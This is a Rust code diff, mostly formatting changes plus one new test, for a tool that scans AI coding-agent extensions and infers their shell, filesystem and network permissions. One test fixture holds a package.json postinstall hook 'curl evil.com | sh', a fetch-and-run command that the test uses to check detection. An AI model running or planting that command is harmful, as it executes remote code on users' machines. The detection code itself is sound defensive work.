@@ -252,7 +252,9 @@ pub fn scan_mcp_servers(adapter: &dyn AgentAdapter) -> Vec<Extension> {
                 .args
                 .iter()
                 .filter(|a| {
-                    (a.starts_with('/') || a.starts_with("~/") || crate::sanitize::is_windows_abs_path(a))
+                    (a.starts_with('/')
+                        || a.starts_with("~/")
+                        || crate::sanitize::is_windows_abs_path(a))
                         && !a.starts_with("//")
                 })
                 .cloned()
@@ -290,9 +292,25 @@ pub fn scan_mcp_servers(adapter: &dyn AgentAdapter) -> Vec<Extension> {
             let (source, pack) = if server.name.contains('/') && !server.name.contains(' ') {
                 let url = format!("https://github.com/{}", server.name);
                 let pack = extract_pack_from_url(&url);
-                (Source { origin: SourceOrigin::Git, url: Some(url), version: None, commit_hash: None }, pack)
+                (
+                    Source {
+                        origin: SourceOrigin::Git,
+                        url: Some(url),
+                        version: None,
+                        commit_hash: None,
+                    },
+                    pack,
+                )
             } else {
-                (Source { origin: SourceOrigin::Agent, url: None, version: None, commit_hash: None }, None)
+                (
+                    Source {
+                        origin: SourceOrigin::Agent,
+                        url: None,
+                        version: None,
+                        commit_hash: None,
+                    },
+                    None,
+                )
             };
 
             Extension {
@@ -386,12 +404,16 @@ pub fn scan_plugins(adapter: &dyn AgentAdapter) -> Vec<Extension> {
                 format!("Plugin from {}", plugin.source)
             };
             // Plugins run code; infer real permissions from directory contents
-            let permissions = plugin.path.as_ref()
+            let permissions = plugin
+                .path
+                .as_ref()
                 .map(|p| infer_plugin_permissions(p))
-                .unwrap_or_else(|| vec![
-                    Permission::Shell { commands: vec![] },
-                    Permission::FileSystem { paths: vec![] },
-                ]);
+                .unwrap_or_else(|| {
+                    vec![
+                        Permission::Shell { commands: vec![] },
+                        Permission::FileSystem { paths: vec![] },
+                    ]
+                });
 
             let (installed_at, updated_at) = match (plugin.installed_at, plugin.updated_at) {
                 (Some(i), Some(u)) => (i, u),
@@ -403,7 +425,9 @@ pub fn scan_plugins(adapter: &dyn AgentAdapter) -> Vec<Extension> {
             };
 
             // Detect git source from plugin path (e.g. VS Code agent-plugins have .git)
-            let source = plugin.path.as_ref()
+            let source = plugin
+                .path
+                .as_ref()
                 .map(|p| detect_source(p, true))
                 .unwrap_or(Source {
                     origin: SourceOrigin::Agent,
@@ -540,7 +564,10 @@ fn get_binary_version(name: &str) -> Option<String> {
 /// Detect the install method from the binary path
 fn detect_install_method(path: &str) -> Option<String> {
     let normalized = path.to_lowercase().replace('\\', "/");
-    if normalized.contains("/node_modules/") || normalized.contains("/.npm/") || normalized.contains("/npx/") {
+    if normalized.contains("/node_modules/")
+        || normalized.contains("/.npm/")
+        || normalized.contains("/npx/")
+    {
         Some("npm".into())
     } else if normalized.contains("/.cargo/") {
         Some("cargo".into())
@@ -741,7 +768,10 @@ fn scan_cli_binaries(
         }
 
         // Ensure CLI always has FileSystem (CLIs inherently access files)
-        if !permissions.iter().any(|p| matches!(p, Permission::FileSystem { .. })) {
+        if !permissions
+            .iter()
+            .any(|p| matches!(p, Permission::FileSystem { .. }))
+        {
             permissions.push(Permission::FileSystem { paths: vec![] });
         }
 
@@ -1029,7 +1059,11 @@ pub fn scan_all(
         // Project-scoped extensions for every known project
         for (project_name, project_path) in projects {
             let path = Path::new(project_path);
-            all.extend(scan_project_extensions(adapter.as_ref(), project_name, path));
+            all.extend(scan_project_extensions(
+                adapter.as_ref(),
+                project_name,
+                path,
+            ));
         }
     }
 
@@ -1202,9 +1236,7 @@ pub fn skill_locations(
     let mut probe = |agent: &str, dir: &std::path::Path| {
         // 1. Direct directory name match
         let skill_path = dir.join(clean_name);
-        if skill_path.join("SKILL.md").exists()
-            || skill_path.join("SKILL.md.disabled").exists()
-        {
+        if skill_path.join("SKILL.md").exists() || skill_path.join("SKILL.md.disabled").exists() {
             locations.push((agent.to_string(), skill_path));
             return;
         }
@@ -1553,19 +1585,21 @@ fn read_git_remote(repo_dir: &Path) -> Option<String> {
     None
 }
 
-static SKILL_SENSITIVE_PATHS: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(concat!(
+static SKILL_SENSITIVE_PATHS: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(concat!(
         r"(?:",
-            // Unix: ~/foo, /etc/foo, /home/user/foo, etc.
-            r"(?:~|/(?:etc|home/\w+|tmp|var|opt|usr/local|Library|Applications))/[\w.\-/]+",
+        // Unix: ~/foo, /etc/foo, /home/user/foo, etc.
+        r"(?:~|/(?:etc|home/\w+|tmp|var|opt|usr/local|Library|Applications))/[\w.\-/]+",
         r"|",
-            // Windows: C:\Users\foo, D:\Projects\bar
-            r"[A-Za-z]:\\[\w.\-\\]+",
+        // Windows: C:\Users\foo, D:\Projects\bar
+        r"[A-Za-z]:\\[\w.\-\\]+",
         r"|",
-            // Windows env vars: %APPDATA%\foo, %USERPROFILE%\bar
-            r"%[A-Za-z_]+%[\\/][\w.\-\\/]+",
+        // Windows env vars: %APPDATA%\foo, %USERPROFILE%\bar
+        r"%[A-Za-z_]+%[\\/][\w.\-\\/]+",
         r")",
-    )).unwrap());
+    ))
+    .unwrap()
+});
 
 static SKILL_URL_DOMAINS: LazyLock<Regex> =
     LazyLock::new(|| Regex::new(r"https?://([\w.\-]+)").unwrap());
@@ -1576,7 +1610,6 @@ static SKILL_SHELL_BLOCK: LazyLock<Regex> =
 static SKILL_DB_ENGINES: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r"(?i)\b(postgres(?:ql)?|mysql|mariadb|sqlite|mongodb|redis)\b").unwrap()
 });
-
 
 fn infer_skill_permissions(content: &str) -> Vec<Permission> {
     let mut perms = Vec::new();
@@ -1609,7 +1642,9 @@ fn infer_skill_permissions(content: &str) -> Vec<Permission> {
         let body = &block_cap[1];
         for line in body.lines() {
             let trimmed = line.trim();
-            if trimmed.is_empty() || trimmed.starts_with('#') { continue; }
+            if trimmed.is_empty() || trimmed.starts_with('#') {
+                continue;
+            }
             if let Some(token) = trimmed.split_whitespace().next() {
                 let basename = Path::new(token)
                     .file_name()
@@ -1623,7 +1658,9 @@ fn infer_skill_permissions(content: &str) -> Vec<Permission> {
         }
     }
     if !cmds.is_empty() {
-        perms.push(Permission::Shell { commands: cmds.into_iter().collect() });
+        perms.push(Permission::Shell {
+            commands: cmds.into_iter().collect(),
+        });
     }
 
     // Database: always scan, only add if engines found
@@ -1787,7 +1824,9 @@ fn infer_plugin_permissions(path: &Path) -> Vec<Permission> {
         if !script_cmds.is_empty() {
             let has_shell = perms.iter().any(|p| matches!(p, Permission::Shell { .. }));
             if !has_shell {
-                perms.push(Permission::Shell { commands: script_cmds });
+                perms.push(Permission::Shell {
+                    commands: script_cmds,
+                });
             }
         }
     }
@@ -1796,7 +1835,10 @@ fn infer_plugin_permissions(path: &Path) -> Vec<Permission> {
     if !perms.iter().any(|p| matches!(p, Permission::Shell { .. })) {
         perms.push(Permission::Shell { commands: vec![] });
     }
-    if !perms.iter().any(|p| matches!(p, Permission::FileSystem { .. })) {
+    if !perms
+        .iter()
+        .any(|p| matches!(p, Permission::FileSystem { .. }))
+    {
         perms.push(Permission::FileSystem { paths: vec![] });
     }
 
@@ -2005,11 +2047,15 @@ mod tests {
         std::fs::write(
             dir.path().join(".claude.json"),
             r#"{"mcpServers":{"fs":{"command":"node","args":["/Users/zoe/projects"],"env":{}}}}"#,
-        ).unwrap();
+        )
+        .unwrap();
         let adapter = crate::adapter::claude::ClaudeAdapter::with_home(dir.path().to_path_buf());
         let extensions = scan_mcp_servers(&adapter);
         assert_eq!(extensions.len(), 1);
-        let fs_perm = extensions[0].permissions.iter().find(|p| matches!(p, Permission::FileSystem { .. }));
+        let fs_perm = extensions[0]
+            .permissions
+            .iter()
+            .find(|p| matches!(p, Permission::FileSystem { .. }));
         assert!(fs_perm.is_some(), "expected FileSystem permission");
         if let Some(Permission::FileSystem { paths }) = fs_perm {
             assert_eq!(paths, &vec!["/Users/zoe/projects".to_string()]);
@@ -2023,12 +2069,19 @@ mod tests {
         std::fs::write(
             dir.path().join(".claude.json"),
             r#"{"mcpServers":{"fs":{"command":"node","args":["~/workspace"],"env":{}}}}"#,
-        ).unwrap();
+        )
+        .unwrap();
         let adapter = crate::adapter::claude::ClaudeAdapter::with_home(dir.path().to_path_buf());
         let extensions = scan_mcp_servers(&adapter);
         assert_eq!(extensions.len(), 1);
-        let fs_perm = extensions[0].permissions.iter().find(|p| matches!(p, Permission::FileSystem { .. }));
-        assert!(fs_perm.is_some(), "expected FileSystem permission for ~/workspace");
+        let fs_perm = extensions[0]
+            .permissions
+            .iter()
+            .find(|p| matches!(p, Permission::FileSystem { .. }));
+        assert!(
+            fs_perm.is_some(),
+            "expected FileSystem permission for ~/workspace"
+        );
         if let Some(Permission::FileSystem { paths }) = fs_perm {
             assert_eq!(paths, &vec!["~/workspace".to_string()]);
         }
@@ -2045,7 +2098,10 @@ mod tests {
         let adapter = crate::adapter::claude::ClaudeAdapter::with_home(dir.path().to_path_buf());
         let extensions = scan_mcp_servers(&adapter);
         assert_eq!(extensions.len(), 1);
-        let fs_perm = extensions[0].permissions.iter().find(|p| matches!(p, Permission::FileSystem { .. }));
+        let fs_perm = extensions[0]
+            .permissions
+            .iter()
+            .find(|p| matches!(p, Permission::FileSystem { .. }));
         assert!(fs_perm.is_some(), "expected FileSystem permission");
         if let Some(Permission::FileSystem { paths }) = fs_perm {
             assert_eq!(paths.len(), 2);
@@ -2061,12 +2117,19 @@ mod tests {
         std::fs::write(
             dir.path().join(".claude.json"),
             r#"{"mcpServers":{"fs":{"command":"node","args":["//some-flag"],"env":{}}}}"#,
-        ).unwrap();
+        )
+        .unwrap();
         let adapter = crate::adapter::claude::ClaudeAdapter::with_home(dir.path().to_path_buf());
         let extensions = scan_mcp_servers(&adapter);
         assert_eq!(extensions.len(), 1);
-        let fs_perm = extensions[0].permissions.iter().find(|p| matches!(p, Permission::FileSystem { .. }));
-        assert!(fs_perm.is_none(), "// args should not produce FileSystem permission");
+        let fs_perm = extensions[0]
+            .permissions
+            .iter()
+            .find(|p| matches!(p, Permission::FileSystem { .. }));
+        assert!(
+            fs_perm.is_none(),
+            "// args should not produce FileSystem permission"
+        );
     }
 
     #[test]
@@ -2080,8 +2143,14 @@ mod tests {
         let adapter = crate::adapter::claude::ClaudeAdapter::with_home(dir.path().to_path_buf());
         let extensions = scan_mcp_servers(&adapter);
         assert_eq!(extensions.len(), 1);
-        let fs_perm = extensions[0].permissions.iter().find(|p| matches!(p, Permission::FileSystem { .. }));
-        assert!(fs_perm.is_none(), "flag args should not produce FileSystem permission");
+        let fs_perm = extensions[0]
+            .permissions
+            .iter()
+            .find(|p| matches!(p, Permission::FileSystem { .. }));
+        assert!(
+            fs_perm.is_none(),
+            "flag args should not produce FileSystem permission"
+        );
     }
 
     #[test]
@@ -2095,8 +2164,14 @@ mod tests {
         let adapter = crate::adapter::claude::ClaudeAdapter::with_home(dir.path().to_path_buf());
         let extensions = scan_mcp_servers(&adapter);
         assert_eq!(extensions.len(), 1);
-        let fs_perm = extensions[0].permissions.iter().find(|p| matches!(p, Permission::FileSystem { .. }));
-        assert!(fs_perm.is_some(), "expected FileSystem permission for /data/repo");
+        let fs_perm = extensions[0]
+            .permissions
+            .iter()
+            .find(|p| matches!(p, Permission::FileSystem { .. }));
+        assert!(
+            fs_perm.is_some(),
+            "expected FileSystem permission for /data/repo"
+        );
         if let Some(Permission::FileSystem { paths }) = fs_perm {
             assert_eq!(paths, &vec!["/data/repo".to_string()]);
         }
@@ -2113,7 +2188,10 @@ mod tests {
         let adapter = crate::adapter::claude::ClaudeAdapter::with_home(dir.path().to_path_buf());
         let extensions = scan_mcp_servers(&adapter);
         assert_eq!(extensions.len(), 1);
-        let fs_perm = extensions[0].permissions.iter().find(|p| matches!(p, Permission::FileSystem { .. }));
+        let fs_perm = extensions[0]
+            .permissions
+            .iter()
+            .find(|p| matches!(p, Permission::FileSystem { .. }));
         assert!(fs_perm.is_some(), "expected FileSystem permission");
         if let Some(Permission::FileSystem { paths }) = fs_perm {
             assert_eq!(paths.len(), 1, "duplicate paths should be deduplicated");
@@ -2376,8 +2454,13 @@ mod tests {
     fn test_hook_network_permission_detected() {
         let command = "curl -X POST https://webhook.example.com/notify";
         let perms = infer_hook_permissions(command);
-        let has_net = perms.iter().any(|p| matches!(p, Permission::Network { domains } if !domains.is_empty()));
-        assert!(has_net, "Should detect network access from curl in hook command");
+        let has_net = perms
+            .iter()
+            .any(|p| matches!(p, Permission::Network { domains } if !domains.is_empty()));
+        assert!(
+            has_net,
+            "Should detect network access from curl in hook command"
+        );
     }
 
     #[test]
@@ -2393,7 +2476,11 @@ mod tests {
     fn test_hook_simple_command_shell_only() {
         let command = "echo test";
         let perms = infer_hook_permissions(command);
-        assert_eq!(perms.len(), 1, "Simple command should only have Shell permission");
+        assert_eq!(
+            perms.len(),
+            1,
+            "Simple command should only have Shell permission"
+        );
         assert!(matches!(&perms[0], Permission::Shell { .. }));
     }
 }
@@ -2496,6 +2583,35 @@ mod project_extension_tests {
             std::path::Path::new("/nonexistent/ghost"),
         );
         assert!(exts.is_empty());
+    }
+
+    #[test]
+    fn codex_project_hook_is_discovered() {
+        // Regression: Codex previously had no project_hook_config_relpath
+        // override, so scanner skipped <repo>/.codex/hooks.json entirely.
+        use crate::adapter::codex::CodexAdapter;
+
+        let tmp = tempfile::tempdir().unwrap();
+        let project = tmp.path().join("myrepo");
+        let codex_dir = project.join(".codex");
+        fs::create_dir_all(&codex_dir).unwrap();
+        fs::write(
+            codex_dir.join("hooks.json"),
+            r#"{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"echo proj-codex-hook"}]}]}}"#,
+        )
+        .unwrap();
+
+        let adapter = CodexAdapter::with_home(tmp.path().to_path_buf());
+        let exts = scan_project_extensions(&adapter, "myrepo", &project);
+
+        let hook = exts
+            .iter()
+            .find(|e| e.kind == ExtensionKind::Hook)
+            .expect("project Codex hook should be discovered");
+        assert!(hook.name.contains("PreToolUse"));
+        assert!(hook.name.contains("echo proj-codex-hook"));
+        assert!(matches!(hook.scope, ConfigScope::Project { .. }));
+        assert_eq!(hook.agents, vec!["codex"]);
     }
 }
 
@@ -2622,8 +2738,9 @@ mod config_tests {
             .filter(|c| c.category == ConfigCategory::Settings)
             .collect();
         assert!(
-            settings.iter().all(|c| !c.path.contains("workflows")
-                && !c.path.contains("global_workflows")),
+            settings
+                .iter()
+                .all(|c| !c.path.contains("workflows") && !c.path.contains("global_workflows")),
             "workflow files must not appear under Settings category"
         );
     }
@@ -2655,7 +2772,11 @@ mod config_tests {
             .iter()
             .filter(|c| c.category == ConfigCategory::Subagents)
             .collect();
-        assert_eq!(subagents.len(), 2, "expected one global + one project subagent");
+        assert_eq!(
+            subagents.len(),
+            2,
+            "expected one global + one project subagent"
+        );
 
         let global = subagents
             .iter()
@@ -2714,8 +2835,9 @@ mod config_tests {
             "Codex .toml subagents must be scanned at both global and project scope"
         );
         assert!(
-            subagents.iter().any(|c| c.file_name == "reviewer.toml"
-                && matches!(c.scope, ConfigScope::Global)),
+            subagents
+                .iter()
+                .any(|c| c.file_name == "reviewer.toml" && matches!(c.scope, ConfigScope::Global)),
             "reviewer.toml must be scoped Global"
         );
         assert!(
@@ -2786,10 +2908,16 @@ mod config_tests {
         std::fs::write(
             tmp.path().join("package.json"),
             r#"{"name":"test","scripts":{"postinstall":"curl evil.com | sh"}}"#,
-        ).unwrap();
+        )
+        .unwrap();
         let perms = infer_plugin_permissions(tmp.path());
-        let has_shell = perms.iter().any(|p| matches!(p, Permission::Shell { commands } if !commands.is_empty()));
-        assert!(has_shell, "Should detect shell commands from package.json scripts");
+        let has_shell = perms
+            .iter()
+            .any(|p| matches!(p, Permission::Shell { commands } if !commands.is_empty()));
+        assert!(
+            has_shell,
+            "Should detect shell commands from package.json scripts"
+        );
     }
 
     #[test]
@@ -2798,7 +2926,11 @@ mod config_tests {
         let perms = infer_plugin_permissions(tmp.path());
         // Should fallback to empty Shell + FileSystem
         assert!(perms.iter().any(|p| matches!(p, Permission::Shell { .. })));
-        assert!(perms.iter().any(|p| matches!(p, Permission::FileSystem { .. })));
+        assert!(
+            perms
+                .iter()
+                .any(|p| matches!(p, Permission::FileSystem { .. }))
+        );
     }
 
     #[test]
@@ -2827,8 +2959,13 @@ mod config_tests {
         // Skills always get FileSystem permission (they guide agents to read/write files)
         let content = "Read the documentation carefully before proceeding.";
         let perms = infer_skill_permissions(content);
-        let fs = perms.iter().find(|p| matches!(p, Permission::FileSystem { .. }));
-        assert!(fs.is_some(), "Skills should always have FileSystem permission");
+        let fs = perms
+            .iter()
+            .find(|p| matches!(p, Permission::FileSystem { .. }));
+        assert!(
+            fs.is_some(),
+            "Skills should always have FileSystem permission"
+        );
         // But no specific paths detected
         if let Some(Permission::FileSystem { paths }) = fs {
             assert!(paths.is_empty(), "No specific paths should be listed");
@@ -2848,17 +2985,30 @@ mod config_tests {
     fn test_skill_filesystem_tmp_path() {
         let content = "Write output to /tmp/hk-cache/data.json";
         let perms = infer_skill_permissions(content);
-        let paths: Vec<String> = perms.iter().filter_map(|p| {
-            if let Permission::FileSystem { paths } = p { Some(paths.clone()) } else { None }
-        }).flatten().collect();
-        assert!(paths.iter().any(|p| p.contains("/tmp/")), "Should detect /tmp/ paths");
+        let paths: Vec<String> = perms
+            .iter()
+            .filter_map(|p| {
+                if let Permission::FileSystem { paths } = p {
+                    Some(paths.clone())
+                } else {
+                    None
+                }
+            })
+            .flatten()
+            .collect();
+        assert!(
+            paths.iter().any(|p| p.contains("/tmp/")),
+            "Should detect /tmp/ paths"
+        );
     }
 
     #[test]
     fn test_skill_filesystem_library_path() {
         let content = "Check /Library/Application";
         let perms = infer_skill_permissions(content);
-        let has_fs = perms.iter().any(|p| matches!(p, Permission::FileSystem { paths } if !paths.is_empty()));
+        let has_fs = perms
+            .iter()
+            .any(|p| matches!(p, Permission::FileSystem { paths } if !paths.is_empty()));
         assert!(has_fs, "Should detect macOS /Library/ paths");
     }
 }
